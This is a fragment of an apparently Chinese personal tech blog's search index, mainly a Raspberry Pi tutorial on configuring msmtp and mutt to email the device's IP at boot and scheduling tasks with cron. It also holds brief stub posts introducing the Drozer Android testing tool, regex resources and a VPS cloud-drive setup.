<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置msmtprc</span></span><br><span class="line">cd ~               <span class="comment">#进入用户根目录</span></span><br><span class="line">touch msmtp.log        <span class="comment">#创建日志文件</span></span><br><span class="line">chmod <span class="number">600</span> msmtp.log    <span class="comment">#查看日志</span></span><br><span class="line">touch .msmtprc         <span class="comment">#创建.msmtprc文件</span></span><br><span class="line">chmod <span class="number">600</span> .msmtprc     <span class="comment">#msmtprc权限</span></span><br><span class="line">sudo nano .msmtprc     <span class="comment">#添加如下内容</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">account default</span><br><span class="line">host smtp.163.com    <span class="comment">#需要开启163邮箱的SMTP服务</span></span><br><span class="line">from xxx@<span class="number">163.</span>com     <span class="comment">#你的邮箱地址</span></span><br><span class="line">auth plain</span><br><span class="line">user xxx@<span class="number">163.</span>com     <span class="comment">#你的邮箱地址</span></span><br><span class="line">password your_password   <span class="comment">#是SMTP授权码</span></span><br><span class="line">logfile /root/msmtp.log <span class="comment"># 在发送邮件之后程序会把发送日志写到这个路径的文件里</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#配置mutt</span></span><br><span class="line">cd ~</span><br><span class="line">touch .muttrc</span><br><span class="line">sudo nano .muttrc  <span class="comment">#添加以下内容，默认填就好了</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">set sendmail=<span class="string">&quot;/usr/bin/msmtp&quot;</span></span><br><span class="line">set use_from=yes</span><br><span class="line">set realname=<span class="string">&quot;Alpha&quot;</span>  <span class="comment">#收件人名字</span></span><br><span class="line">set from=<span class="string">&quot;xxx@163.com&quot;</span></span><br><span class="line">set editor=<span class="string">&quot;vim&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#测试</span><br><span class="line">测试配置文件：msmtp -P</span><br><span class="line">测试smtp服务器：msmtp -S</span><br><span class="line">echo &quot;你好，我是测试用的，谢谢&quot; | mutt -s &quot;你好啊&quot; xxx@163.com</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/OM%5B3SUTVJH413%24MM.png"></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/52LEB88L0Y%7E_%60M%5BD.png"></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/YVF38P%7ECZFXA90ID7.png"></p>
<h3 id="脚本定时-开机自启动"><a href="#脚本定时-开机自启动" class="headerlink" title="脚本定时/开机自启动"></a>脚本定时/开机自启动</h3><p>这个要单独列出来一下。因为一个脚本的核心还是自动化，方便实用。</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"><span class="comment">#开机自启动</span></span><br><span class="line">sudo nano /etc/rc.local</span><br><span class="line">sudo bash /home/pi/sendmail.sh                 <span class="comment">#我的sendmail.sh是开机发送自己的ip，文末会贴上</span></span><br></pre></td></tr></table></figure>


<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#定时任务</span></span><br><span class="line"><span class="comment">#cron进行定时器</span></span><br><span class="line">crontab -e         <span class="comment">#编译定时任务</span></span><br><span class="line">// 从左往右：  分 时 日 月 星期 </span><br><span class="line"><span class="comment"># m h  dom mon dow   command</span></span><br><span class="line"><span class="number">30</span> <span class="number">5</span>   <span class="number">10</span>   <span class="number">3</span>   *   touch /tmp/test.log  // 表示每年<span class="number">3</span>月<span class="number">10</span>号<span class="number">5</span>点<span class="number">30</span>分，执行touch /tmp/test.log</span><br><span class="line"><span class="number">10</span> <span class="number">18</span>   *   *   *   echo <span class="string">&quot;Hello World&quot;</span> &gt; /home/pi/log  // 每天的<span class="number">18</span>点<span class="number">10</span>分执行echo <span class="string">&quot;Hello World&quot;</span> &gt; /home/pi/log</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="抓取定位包"><a href="#抓取定位包" class="headerlink" title="抓取定位包"></a>抓取定位包</h3><p>我使用的是eteams打卡，它不支持pc端的签到，所以我只能使用模拟器代理去抓包。</p>
<p>一些自己使用的脚本：</p>
<ul>
<li>1.定时ip任务: #!/bin/bash<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># check network availability</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># get the IP address of eth0, e.g. &quot;192.168.16.5&quot;</span></span><br><span class="line">ETH0_IP_ADDR=`/sbin/ifconfig eth0 | sed -n &quot;2,2p&quot; | awk &#x27;&#123;print substr($2,1)&#125;&#x27;`</span><br><span class="line">  </span><br><span class="line"><span class="comment"># send the Email</span></span><br><span class="line">echo <span class="string">&quot;Current time: `date &#x27;+%F %T&#x27;`. Enjoy it&quot;</span> | mutt -s <span class="string">&quot;IP Address of Raspberry Pi: $ETH0_IP_ADDR&quot;</span> xxx@<span class="number">163.</span>com</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li>2.报告车况，车辆到站时间<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">  </span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>树莓派</category>
      </categories>
      <tags>
        <tag>树莓派</tag>
        <tag>自动化</tag>
      </tags>
  </entry>
  <entry>
    <title>移动安全测试</title>
    <url>/2020/02/29/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>主要是对移动端漏洞的检测</p>
<a id="more"></a>

<hr>
<h1 id="0x00-前言："><a href="#0x00-前言：" class="headerlink" title="0x00 前言："></a>0x00 前言：</h1><p>随着互联网及智能便携设备的普及，移动互联网迅速崛起，移动端的各类应用程序越来<br>越丰富，给予大众便利的同时，出现了大量互联网恶意程序，严重危害网民的个人信息安全与财产安全。</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200229153456.png"></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200229153700.png"></p>
<h1 id="0x01-移动测试工具：-Drozer"><a href="#0x01-移动测试工具：-Drozer" class="headerlink" title="0x01 移动测试工具： Drozer"></a>0x01 移动测试工具： Drozer</h1><p>Drozer是一款针对Android的安全测试框架，分为安装在PC端的控制台、安装在终端上的代理APP两部分。可以利用APP的IPC通信，动态的发现被测试APP的安全风险。</p>
<p>Drozer的功能点：</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>简单的正则学习</title>
    <url>/2020/03/17/%E7%AE%80%E5%8D%95%E7%9A%84%E6%AD%A3%E5%88%99%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>正则的使用无处不在：</p>
<p>mysql,oracle,php,bash,python,apache,nginx….</p>
<a id="more"></a>

<hr>
<h1 id="正则的查找"><a href="#正则的查找" class="headerlink" title="正则的查找"></a>正则的查找</h1><p>Github <a href="https://github.com/cdoco/learn-regex-zh">RE学习</a></p>
<p>VScode<a href="https://github.com/any86/any-rule">插件</a></p>
<h1 id="什么是正则表达式"><a href="#什么是正则表达式" class="headerlink" title="什么是正则表达式"></a>什么是正则表达式</h1>]]></content>
      <categories>
        <category>bash</category>
      </categories>
      <tags>
        <tag>bash</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>阿里云vps搭建私人云盘</title>
    <url>/2020/02/10/%E9%98%BF%E9%87%8C%E4%BA%91vps%E6%90%AD%E5%BB%BA%E7%A7%81%E4%BA%BA%E4%BA%91%E7%9B%98/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>我很酷<br>我可以</p>
<p>你滚吧</p>
<a id="more"></a>

<hr>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>VPS</tag>
      </tags>
  </entry>
</search>
